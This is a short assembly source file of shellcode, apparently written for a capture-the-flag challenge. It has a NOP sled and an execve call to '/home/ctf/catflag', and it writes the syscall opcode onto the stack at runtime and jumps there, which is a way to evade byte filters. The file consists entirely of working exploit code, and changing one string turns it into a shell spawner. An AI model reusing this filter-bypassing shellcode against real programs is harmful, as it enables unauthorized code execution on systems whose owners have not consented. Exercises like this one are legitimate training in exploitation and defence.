.global _start
_start:
.intel_syntax noprefix
.fill 2048, 1, 0x90
real_start:
	mov rax, 59            # execve syscall number
	lea rdi, [rip+binsh]   # points rdi to /bin/sh string
	mov rsi, 0             # makes argv arg null
	mov rdx, 0             # makes envp arg null
    sub rsp, 2
    mov BYTE PTR [rsp], 0x0f
    mov BYTE PTR [rsp+1], 0x05
    jmp rsp
binsh:                     # label for /bin/sh string
	.string "/home/ctf/catflag"
